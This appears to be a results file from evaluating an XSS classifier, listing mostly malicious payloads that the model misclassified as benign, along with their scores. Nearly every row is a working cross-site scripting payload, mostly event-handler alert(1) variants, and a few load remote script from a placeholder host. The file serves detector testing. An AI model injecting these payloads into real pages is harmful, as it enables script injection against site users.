payload,true_label,predicted_label,probabilities,inference_time_ms
<image3 onpointerover=alert(1)>XSS</image3>,1,0,"{'benign': 0.5696, 'malicious': 0.4304}",20.127799999997364
"<article onmouseenter=""alert(1)"">test</article>",1,0,"{'benign': 0.5798, 'malicious': 0.4202}",18.858600000001502
<video onpointerover=alert(1)>XSS</video>,1,0,"{'benign': 0.6095, 'malicious': 0.3905}",20.703300000008085
"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",1,0,"{'benign': 0.57, 'malicious': 0.43}",18.56779999999958
<i onpointerleave=alert(1)>XSS</i>,1,0,"{'benign': 0.6353, 'malicious': 0.3647}",24.85239999998612
<source onpointerleave=alert(1)>XSS</source>,1,0,"{'benign': 0.647, 'malicious': 0.353}",22.463999999999373
<nobr onpointerleave=alert(1)>XSS</nobr>,1,0,"{'benign': 0.5802, 'malicious': 0.4198}",26.78690000000472
"<style>:target {transform: rotate(180deg);}</style><xmp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xmp>",1,0,"{'benign': 0.5877, 'malicious': 0.4123}",38.47220000000107
"<tt draggable=""true"" ondragend=""alert(1)"">test</tt>",1,0,"{'benign': 0.5864, 'malicious': 0.4136}",23.36710000000153
<title onpointerover=alert(1)>XSS</title>,1,0,"{'benign': 0.5718, 'malicious': 0.4282}",19.543200000001093
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",1,0,"{'benign': 0.5885, 'malicious': 0.4115}",32.48359999999195
"<center onmousedown=""alert(1)"">test</center>",1,0,"{'benign': 0.5526, 'malicious': 0.4474}",20.132099999997877
"document.getElementsByClassName(""example"")",1,0,"{'benign': 0.5268, 'malicious': 0.4732}",22.37350000000049
<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>,1,0,"{'benign': 0.5879, 'malicious': 0.4121}",29.511799999994537
<IMG SRC=javascript:alert('')>,1,0,"{'benign': 0.5619, 'malicious': 0.4381}",22.095600000000104
"<marquee onmouseup=""alert(1)"">test</marquee>",1,0,"{'benign': 0.5715, 'malicious': 0.4285}",23.514499999990335
"<frameset onbeforecopy=""alert(1)"" contenteditable>test</frameset>",1,0,"{'benign': 0.596, 'malicious': 0.404}",23.641900000001215
"<div draggable=""true"" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>",1,0,"{'benign': 0.6097, 'malicious': 0.3903}",29.379000000005817
"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",1,0,"{'benign': 0.5792, 'malicious': 0.4208}",39.935400000004506
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",1,0,"{'benign': 0.6435, 'malicious': 0.3565}",19.39560000000995
"<figcaption onmouseup=""alert(1)"">test</figcaption>",1,0,"{'benign': 0.5701, 'malicious': 0.4299}",22.51420000000337
"<ins onkeyup=""alert(1)"" contenteditable>test</ins>",1,0,"{'benign': 0.5753, 'malicious': 0.4247}",21.781700000005344
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",1,0,"{'benign': 0.6367, 'malicious': 0.3633}",22.887799999992353
<dialog onpointermove=alert(1)>XSS</dialog>,1,0,"{'benign': 0.5697, 'malicious': 0.4303}",19.23089999999661
<font onpointerover=alert(1)>XSS</font>,1,0,"{'benign': 0.5309, 'malicious': 0.4691}",20.85719999999469
"<summary onmouseenter=""alert(1)"">test</summary>",1,0,"{'benign': 0.5685, 'malicious': 0.4315}",22.656699999998864
"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",1,0,"{'benign': 0.516, 'malicious': 0.484}",20.850600000002828
"<template oncut=""alert(1)"" contenteditable>test</template>",1,0,"{'benign': 0.5831, 'malicious': 0.4169}",21.904899999995564
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,1,0,"{'benign': 0.56, 'malicious': 0.44}",26.509200000006672
<button onfocusout=alert(1) id=x></button><input autofocus>,1,0,"{'benign': 0.5479, 'malicious': 0.4521}",22.34810000000209
"<style>:target {transform: rotate(180deg);}</style><datalist id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></datalist>",1,0,"{'benign': 0.6026, 'malicious': 0.3974}",40.16659999999206
"<param oncut=""alert(1)"" contenteditable>test</param>",1,0,"{'benign': 0.5023, 'malicious': 0.4977}",23.65869999999859
"<bdi ondblclick=""alert(1)"">test</bdi>",1,0,"{'benign': 0.611, 'malicious': 0.389}",24.9507000000051
"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>",1,0,"{'benign': 0.6051, 'malicious': 0.3949}",27.139099999999416
"<wbr onclick=""alert(1)"">test</wbr>",1,0,"{'benign': 0.6128, 'malicious': 0.3872}",24.513300000009508
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",1,0,"{'benign': 0.6154, 'malicious': 0.3846}",23.531999999988784
"<center onbeforecopy=""alert(1)"" contenteditable>test</center>",1,0,"{'benign': 0.631, 'malicious': 0.369}",21.178800000001274
"<center draggable=""true"" ondragleave=""alert(1)"">test</center>",1,0,"{'benign': 0.5657, 'malicious': 0.4343}",22.87890000000914
"<abbr ondblclick=""alert(1)"">test</abbr>",1,0,"{'benign': 0.659, 'malicious': 0.341}",20.468000000008146
<colgroup onpointermove=alert(1)>XSS</colgroup>,1,0,"{'benign': 0.639, 'malicious': 0.361}",21.799200000003793
AI becomes hugely successful in the early 21st century,0,1,"{'benign': 0.4473, 'malicious': 0.5527}",18.982699999995134
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,1,0,"{'benign': 0.5628, 'malicious': 0.4372}",23.673199999990402
<svg><address onload=alert(1)></address>,1,0,"{'benign': 0.5017, 'malicious': 0.4983}",21.257099999999696
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",1,0,"{'benign': 0.646, 'malicious': 0.354}",24.135100000009402
<sub id=x tabindex=1 onfocusin=alert(1)></sub>,1,0,"{'benign': 0.5398, 'malicious': 0.4602}",25.767900000005284
"<time onclick=""alert(1)"">test</time>",1,0,"{'benign': 0.5833, 'malicious': 0.4167}",19.574599999998554
"<aside onmouseout=""alert(1)"">test</aside>",1,0,"{'benign': 0.5809, 'malicious': 0.4191}",16.719599999987622
"<select draggable=""true"" ondrag=""alert(1)"">test</select>",1,0,"{'benign': 0.532, 'malicious': 0.468}",25.167099999990228
"<canvas oncontextmenu=""alert(1)"">test</canvas>",1,0,"{'benign': 0.5495, 'malicious': 0.4505}",23.804400000003056
<figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>,1,0,"{'benign': 0.5285, 'malicious': 0.4715}",22.15059999998914
"<source oncontextmenu=""alert(1)"">test</source>",1,0,"{'benign': 0.6179, 'malicious': 0.3821}",19.04639999999347
"<tbody onkeypress=""alert(1)"" contenteditable>test</tbody>",1,0,"{'benign': 0.5943, 'malicious': 0.4057}",23.937799999998788
"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",1,0,"{'benign': 0.5289, 'malicious': 0.4711}",20.62409999999204
<source onpointerdown=alert(1)>XSS</source>,1,0,"{'benign': 0.612, 'malicious': 0.388}",20.78709999999262
<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>,1,0,"{'benign': 0.5346, 'malicious': 0.4654}",27.82290000000387
<button onpointermove=alert(1)>XSS</button>,1,0,"{'benign': 0.5936, 'malicious': 0.4064}",18.525600000003806
"<col onmousemove=""alert(1)"">test</col>",1,0,"{'benign': 0.5962, 'malicious': 0.4038}",20.845499999992967
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",1,0,"{'benign': 0.6322, 'malicious': 0.3678}",30.008100000003424
"<b onmouseup=""alert(1)"">test</b>",1,0,"{'benign': 0.5949, 'malicious': 0.4051}",19.91069999999695
"<body onkeypress=""alert(1)"" contenteditable>test</body>",1,0,"{'benign': 0.6115, 'malicious': 0.3885}",18.290299999989656
 </div>,0,1,"{'benign': 0.4444, 'malicious': 0.5556}",13.42889999999386
<ol onpointerout=alert(1)>XSS</ol>,1,0,"{'benign': 0.5828, 'malicious': 0.4172}",15.878499999999462
"<button onpaste=""alert(1)"" contenteditable>test</button>",1,0,"{'benign': 0.5839, 'malicious': 0.4161}",21.046599999991145
"<h1 draggable=""true"" ondragend=""alert(1)"">test</h1>",1,0,"{'benign': 0.5602, 'malicious': 0.4398}",25.01289999999301
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",1,0,"{'benign': 0.5654, 'malicious': 0.4346}",17.59059999999124
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1,0,"{'benign': 0.6333, 'malicious': 0.3667}",18.65739999999505
"<center draggable=""true"" ondrag=""alert(1)"">test</center>",1,0,"{'benign': 0.5323, 'malicious': 0.4677}",21.288100000006693
"<table oncontextmenu=""alert(1)"">test</table>",1,0,"{'benign': 0.5385, 'malicious': 0.4615}",23.329900000007342
<samp onpointermove=alert(1)>XSS</samp>,1,0,"{'benign': 0.5824, 'malicious': 0.4176}",15.77220000000068
<mark onpointerleave=alert(1)>XSS</mark>,1,0,"{'benign': 0.5693, 'malicious': 0.4307}",18.922599999996237
"<main onbeforecut=""alert(1)"" contenteditable>test</main>",1,0,"{'benign': 0.6054, 'malicious': 0.3946}",19.72310000000732
"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>",1,0,"{'benign': 0.594, 'malicious': 0.406}",41.040899999998715
 </div>,0,1,"{'benign': 0.4444, 'malicious': 0.5556}",15.757699999994657
<body onload=alert(1)>,1,0,"{'benign': 0.5225, 'malicious': 0.4775}",19.418100000009986
"<image onmousedown=""alert(1)"">test</image>",1,0,"{'benign': 0.5329, 'malicious': 0.4671}",22.86199999998928
"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xml#"")}</STYLE>",1,0,"{'benign': 0.6505, 'malicious': 0.3495}",27.126699999996617
<svg><noembed onload=alert(1)></noembed>,1,0,"{'benign': 0.6058, 'malicious': 0.3942}",20.674200000001974
"<rp onmouseenter=""alert(1)"">test</rp>",1,0,"{'benign': 0.5649, 'malicious': 0.4351}",22.33990000000574
"<element onmouseout=""alert(1)"">test</element>",1,0,"{'benign': 0.5353, 'malicious': 0.4647}",18.534399999992957
"<samp onpaste=""alert(1)"" contenteditable>test</samp>",1,0,"{'benign': 0.5848, 'malicious': 0.4152}",21.4131999999978
"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",1,0,"{'benign': 0.5724, 'malicious': 0.4276}",22.009100000005333
"<object onmouseover=""alert(1)"">test</object>",1,0,"{'benign': 0.5423, 'malicious': 0.4577}",18.293700000000968
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",1,0,"{'benign': 0.5866, 'malicious': 0.4134}",38.19570000000283
<embed onpointermove=alert(1)>XSS</embed>,1,0,"{'benign': 0.5586, 'malicious': 0.4414}",21.347000000005778
"<th onbeforepaste=""alert(1)"" contenteditable>test</th>",1,0,"{'benign': 0.5816, 'malicious': 0.4184}",22.419700000000375
"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",1,0,"{'benign': 0.5513, 'malicious': 0.4487}",24.14359999998794
<dl onpointerdown=alert(1)>XSS</dl>,1,0,"{'benign': 0.6017, 'malicious': 0.3983}",19.238300000012032
"<blink onmousedown=""alert(1)"">test</blink>",1,0,"{'benign': 0.5422, 'malicious': 0.4578}",20.269900000002394
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,1,0,"{'benign': 0.557, 'malicious': 0.443}",24.498500000007084
"<option onbeforepaste=""alert(1)"" contenteditable>test</option>",1,0,"{'benign': 0.6094, 'malicious': 0.3906}",23.867999999993117
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",1,0,"{'benign': 0.5874, 'malicious': 0.4126}",22.50060000000076
<input4 onpointermove=alert(1)>XSS</input4>,1,0,"{'benign': 0.5722, 'malicious': 0.4278}",16.14709999999775
"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rb>",1,0,"{'benign': 0.6469, 'malicious': 0.3531}",30.61740000001123
"<tt ondblclick=""alert(1)"">test</tt>",1,0,"{'benign': 0.6023, 'malicious': 0.3977}",21.709200000003648
"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>",1,0,"{'benign': 0.6249, 'malicious': 0.3751}",28.885400000007166
"<track onmouseover=""alert(1)"">test</track>",1,0,"{'benign': 0.5469, 'malicious': 0.4531}",20.033100000006243
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1,0,"{'benign': 0.5106, 'malicious': 0.4894}",25.42989999999179
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",1,0,"{'benign': 0.5446, 'malicious': 0.4554}",18.213099999996984
"<section onmouseover=""alert(1)"">test</section>",1,0,"{'benign': 0.5663, 'malicious': 0.4337}",22.075600000007967
"<time oncontextmenu=""alert(1)"">test</time>",1,0,"{'benign': 0.5905, 'malicious': 0.4095}",21.785999999991645
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",1,0,"{'benign': 0.5933, 'malicious': 0.4067}",20.360300000007214
"<bgsound onbeforepaste=""alert(1)"" contenteditable>test</bgsound>",1,0,"{'benign': 0.6151, 'malicious': 0.3849}",22.396000000000527
"<style>@keyframes slidein {}</style><pre style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></pre>",1,0,"{'benign': 0.5842, 'malicious': 0.4158}",40.67919999999958
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionend=alert(1)></code>",1,0,"{'benign': 0.6058, 'malicious': 0.3942}",31.820199999998522
"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionend=alert(1)></applet>",1,0,"{'benign': 0.6406, 'malicious': 0.3594}",24.508199999999647
"<col oncut=""alert(1)"" contenteditable>test</col>",1,0,"{'benign': 0.6061, 'malicious': 0.3939}",22.433600000013598
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",1,0,"{'benign': 0.6119, 'malicious': 0.3881}",20.395600000000513
"<figure draggable=""true"" ondragenter=""alert(1)"">test</figure>",1,0,"{'benign': 0.5461, 'malicious': 0.4539}",24.160600000001864
"<h1 onkeypress=""alert(1)"" contenteditable>test</h1>",1,0,"{'benign': 0.5604, 'malicious': 0.4396}",17.462700000010045
<svg><bdi onload=alert(1)></bdi>,1,0,"{'benign': 0.578, 'malicious': 0.422}",20.980500000007396
"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",1,0,"{'benign': 0.55, 'malicious': 0.45}",21.85670000000073
"<picture onmouseup=""alert(1)"">test</picture>",1,0,"{'benign': 0.58, 'malicious': 0.42}",17.587100000000078
"<details draggable=""true"" ondragend=""alert(1)"">test</details>",1,0,"{'benign': 0.5748, 'malicious': 0.4252}",19.55920000000333
"<STYLE TYPE=""text/javascript"">alert('');</STYLE>",1,0,"{'benign': 0.5726, 'malicious': 0.4274}",21.602299999997854
<applet onreadystatechange=alert(1)></applet>,1,0,"{'benign': 0.6021, 'malicious': 0.3979}",21.461099999996236
"<output oncut=""alert(1)"" contenteditable>test</output>",1,0,"{'benign': 0.5658, 'malicious': 0.4342}",20.733800000002134
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationend=""alert(1)""></u>",1,0,"{'benign': 0.5733, 'malicious': 0.4267}",29.80089999999791
"<element onmouseenter=""alert(1)"">test</element>",1,0,"{'benign': 0.5741, 'malicious': 0.4259}",21.678399999998987
"<span draggable=""true"" ondragenter=""alert(1)"">test</span>",1,0,"{'benign': 0.5417, 'malicious': 0.4583}",23.689399999994976
"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",1,0,"{'benign': 0.6215, 'malicious': 0.3785}",21.279499999991458
"<command onkeyup=""alert(1)"" contenteditable>test</command>",1,0,"{'benign': 0.5452, 'malicious': 0.4548}",22.100699999995754
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",1,0,"{'benign': 0.5154, 'malicious': 0.4846}",22.81089999999608
"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",1,0,"{'benign': 0.5907, 'malicious': 0.4093}",20.459800000011796
"<source onmouseup=""alert(1)"">test</source>",1,0,"{'benign': 0.625, 'malicious': 0.375}",22.410100000001876
<shadow onpointermove=alert(1)>XSS</shadow>,1,0,"{'benign': 0.6092, 'malicious': 0.3908}",19.634799999991515
<svg onpointerenter=alert(1)>XSS</svg>,1,0,"{'benign': 0.6058, 'malicious': 0.3942}",19.353100000003565
<hgroup onpointerenter=alert(1)>XSS</hgroup>,1,0,"{'benign': 0.5703, 'malicious': 0.4297}",16.785999999996193
"<keygen onclick=""alert(1)"">test</keygen>",1,0,"{'benign': 0.6055, 'malicious': 0.3945}",19.113500000003114
"<section onmouseup=""alert(1)"">test</section>",1,0,"{'benign': 0.5936, 'malicious': 0.4064}",15.398300000001086
"<style>:target {color: red;}</style><aside id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></aside>",1,0,"{'benign': 0.6356, 'malicious': 0.3644}",27.018400000002885
"<body draggable=""true"" ondrag=""alert(1)"">test</body>",1,0,"{'benign': 0.5356, 'malicious': 0.4644}",23.68079999999395
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",1,0,"{'benign': 0.5752, 'malicious': 0.4248}",20.789299999989908
<image2 onpointerdown=alert(1)>XSS</image2>,1,0,"{'benign': 0.6058, 'malicious': 0.3942}",15.41620000000421
"<element draggable=""true"" ondrag=""alert(1)"">test</element>",1,0,"{'benign': 0.5082, 'malicious': 0.4918}",19.009300000007556
"<figure oncut=""alert(1)"" contenteditable>test</figure>",1,0,"{'benign': 0.5728, 'malicious': 0.4272}",19.953700000002073
<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,1,0,"{'benign': 0.5313, 'malicious': 0.4687}",19.98159999999416
</div>,0,1,"{'benign': 0.4444, 'malicious': 0.5556}",15.861000000001013
"<figcaption draggable=""true"" ondrag=""alert(1)"">test</figcaption>",1,0,"{'benign': 0.5022, 'malicious': 0.4978}",24.567700000005743
"<section ondblclick=""alert(1)"">test</section>",1,0,"{'benign': 0.5937, 'malicious': 0.4063}",20.391700000004676
"<map onkeydown=""alert(1)"" contenteditable>test</map>",1,0,"{'benign': 0.5706, 'malicious': 0.4294}",22.767000000001758
"<link draggable=""true"" ondragenter=""alert(1)"">test</link>",1,0,"{'benign': 0.5555, 'malicious': 0.4445}",24.716999999995437
"<img onkeypress=""alert(1)"" contenteditable>test</img>",1,0,"{'benign': 0.5988, 'malicious': 0.4012}",22.65459999999564
<tr onpointermove=alert(1)>XSS</tr>,1,0,"{'benign': 0.6047, 'malicious': 0.3953}",20.83199999999863
<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,1,0,"{'benign': 0.5415, 'malicious': 0.4585}",18.270499999999856
"<STYLE type=""text/css"">BODY{background:url(""<javascript:alert>('')"")}</STYLE>",1,0,"{'benign': 0.5971, 'malicious': 0.4029}",28.487299999994775
"<dt onkeydown=""alert(1)"" contenteditable>test</dt>",1,0,"{'benign': 0.6342, 'malicious': 0.3658}",16.77090000001158
<del id=x tabindex=1 onactivate=alert(1)></del>,1,0,"{'benign': 0.5013, 'malicious': 0.4987}",22.813900000002718
"<output onkeypress=""alert(1)"" contenteditable>test</output>",1,0,"{'benign': 0.5787, 'malicious': 0.4213}",16.35930000000485
"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",1,0,"{'benign': 0.5921, 'malicious': 0.4079}",20.419399999994425
	 <div>,0,1,"{'benign': 0.4361, 'malicious': 0.5639}",17.216399999995247
"<noembed onbeforecopy=""alert(1)"" contenteditable>test</noembed>",1,0,"{'benign': 0.656, 'malicious': 0.344}",24.43989999999019
"<slot ondblclick=""alert(1)"">test</slot>",1,0,"{'benign': 0.5802, 'malicious': 0.4198}",22.9487000000006
"<dd onpaste=""alert(1)"" contenteditable>test</dd>",1,0,"{'benign': 0.598, 'malicious': 0.402}",19.582499999998504
"<li onkeyup=""alert(1)"" contenteditable>test</li>",1,0,"{'benign': 0.597, 'malicious': 0.403}",21.206200000008835
<keygen onpointerenter=alert(1)>XSS</keygen>,1,0,"{'benign': 0.5611, 'malicious': 0.4389}",22.951100000000224
<rtc onpointerdown=alert(1)>XSS</rtc>,1,0,"{'benign': 0.5527, 'malicious': 0.4473}",19.277100000010705
"<legend ondblclick=""alert(1)"">test</legend>",1,0,"{'benign': 0.5838, 'malicious': 0.4162}",20.386100000010288
"<footer draggable=""true"" ondragend=""alert(1)"">test</footer>",1,0,"{'benign': 0.5174, 'malicious': 0.4826}",19.05090000001053
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",1,0,"{'benign': 0.6176, 'malicious': 0.3824}",25.35479999998813
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",1,0,"{'benign': 0.5258, 'malicious': 0.4742}",23.107400000000666
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",1,0,"{'benign': 0.5466, 'malicious': 0.4534}",22.535199999992983
"<rb draggable=""true"" ondrag=""alert(1)"">test</rb>",1,0,"{'benign': 0.5521, 'malicious': 0.4479}",24.316599999991695
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",1,0,"{'benign': 0.5868, 'malicious': 0.4132}",29.452200000008588
"<pre ondblclick=""alert(1)"">test</pre>",1,0,"{'benign': 0.592, 'malicious': 0.408}",22.581799999997543
<wbr onpointerleave=alert(1)>XSS</wbr>,1,0,"{'benign': 0.5998, 'malicious': 0.4002}",23.286499999997545
"<ol onmouseleave=""alert(1)"">test</ol>",1,0,"{'benign': 0.583, 'malicious': 0.417}",19.95110000000011
"<area onclick=""alert(1)"">test</area>",1,0,"{'benign': 0.5279, 'malicious': 0.4721}",18.77100000000098
"<span onpaste=""alert(1)"" contenteditable>test</span>",1,0,"{'benign': 0.6019, 'malicious': 0.3981}",23.709199999998987
<header id=x tabindex=1 onfocus=alert(1)></header>,1,0,"{'benign': 0.5079, 'malicious': 0.4921}",22.576299999997218
<hgroup onpointerleave=alert(1)>XSS</hgroup>,1,0,"{'benign': 0.5651, 'malicious': 0.4349}",21.937100000002374
"<fieldset onkeypress=""alert(1)"" contenteditable>test</fieldset>",1,0,"{'benign': 0.5639, 'malicious': 0.4361}",26.34189999999137
"<sup onmouseleave=""alert(1)"">test</sup>",1,0,"{'benign': 0.5689, 'malicious': 0.4311}",22.685799999990763
<select onpointerup=alert(1)>XSS</select>,1,0,"{'benign': 0.6038, 'malicious': 0.3962}",18.94609999999375
<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>,1,0,"{'benign': 0.5278, 'malicious': 0.4722}",21.776400000007357
<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,1,0,"{'benign': 0.5178, 'malicious': 0.4822}",20.85289999999418
<tfoot onpointerleave=alert(1)>XSS</tfoot>,1,0,"{'benign': 0.6034, 'malicious': 0.3966}",21.852600000002553
<article onpointerleave=alert(1)>XSS</article>,1,0,"{'benign': 0.6094, 'malicious': 0.3906}",20.99359999999706
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""httx://.rocks/.js""></SCRIPT>",1,0,"{'benign': 0.5983, 'malicious': 0.4017}",31.361799999999107
"<button ondblclick=""alert(1)"">test</button>",1,0,"{'benign': 0.6008, 'malicious': 0.3992}",22.4285999999978
"<spacer onmouseenter=""alert(1)"">test</spacer>",1,0,"{'benign': 0.6124, 'malicious': 0.3876}",21.574600000008104
"<hr onmousedown=""alert(1)"">test</hr>",1,0,"{'benign': 0.5865, 'malicious': 0.4135}",23.47620000000461
"<html onmouseover=""alert(1)"">test</html>",1,0,"{'benign': 0.5508, 'malicious': 0.4492}",26.633000000003904
"<legend oncut=""alert(1)"" contenteditable>test</legend>",1,0,"{'benign': 0.5692, 'malicious': 0.4308}",24.668899999994665
"<base onmouseout=""alert(1)"">test</base>",1,0,"{'benign': 0.5461, 'malicious': 0.4539}",23.973900000001436
<select onpointerdown=alert(1)>XSS</select>,1,0,"{'benign': 0.583, 'malicious': 0.417}",22.355300000000966
<acronym onpointerup=alert(1)>XSS</acronym>,1,0,"{'benign': 0.547, 'malicious': 0.453}",20.122400000005314
"<div class=""section"" id=""solving-specific-problems"">",0,1,"{'benign': 0.4897, 'malicious': 0.5103}",30.523999999999774
"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",1,0,"{'benign': 0.5596, 'malicious': 0.4404}",32.85530000000847
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",1,0,"{'benign': 0.5774, 'malicious': 0.4226}",39.25399999999968
"<style>:target {color: red;}</style><track id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></track>",1,0,"{'benign': 0.6303, 'malicious': 0.3697}",39.21160000000157
"<progress draggable=""true"" ondragend=""alert(1)"">test</progress>",1,0,"{'benign': 0.5055, 'malicious': 0.4945}",28.224199999996813
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",1,0,"{'benign': 0.5322, 'malicious': 0.4678}",30.94600000000014
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>",1,0,"{'benign': 0.599, 'malicious': 0.401}",34.06370000000436
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",1,0,"{'benign': 0.5746, 'malicious': 0.4254}",48.50489999999752
<fieldset onpointerleave=alert(1)>XSS</fieldset>,1,0,"{'benign': 0.5752, 'malicious': 0.4248}",29.55930000000251
<svg><picture onload=alert(1)></picture>,1,0,"{'benign': 0.5995, 'malicious': 0.4005}",26.06980000000192
"<iframe onbeforepaste=""alert(1)"" contenteditable>test</iframe>",1,0,"{'benign': 0.609, 'malicious': 0.391}",26.57219999998972
<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>,1,0,"{'benign': 0.5514, 'malicious': 0.4486}",30.872700000003306
"<i draggable=""true"" ondragstart=""alert(1)"">test</i>",1,0,"{'benign': 0.5483, 'malicious': 0.4517}",28.682299999999827
"<center onpaste=""alert(1)"" contenteditable>test</center>",1,0,"{'benign': 0.6187, 'malicious': 0.3813}",31.571700000000646
"<meta onmousedown=""alert(1)"">test</meta>",1,0,"{'benign': 0.537, 'malicious': 0.463}",26.113999999992643
"<image draggable=""true"" ondragstart=""alert(1)"">test</image>",1,0,"{'benign': 0.5244, 'malicious': 0.4756}",28.710500000002526
"<multicol onmouseenter=""alert(1)"">test</multicol>",1,0,"{'benign': 0.6081, 'malicious': 0.3919}",23.764200000002234
	 <div>,0,1,"{'benign': 0.4361, 'malicious': 0.5639}",20.740400000008208
"<small onmouseup=""alert(1)"">test</small>",1,0,"{'benign': 0.6068, 'malicious': 0.3932}",24.166300000004526
<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>,1,0,"{'benign': 0.5483, 'malicious': 0.4517}",29.27990000000591
"<s onbeforecopy=""alert(1)"" contenteditable>test</s>",1,0,"{'benign': 0.5949, 'malicious': 0.4051}",23.492400000009184
"<option onbeforecut=""alert(1)"" contenteditable>test</option>",1,0,"{'benign': 0.6013, 'malicious': 0.3987}",27.58390000001043
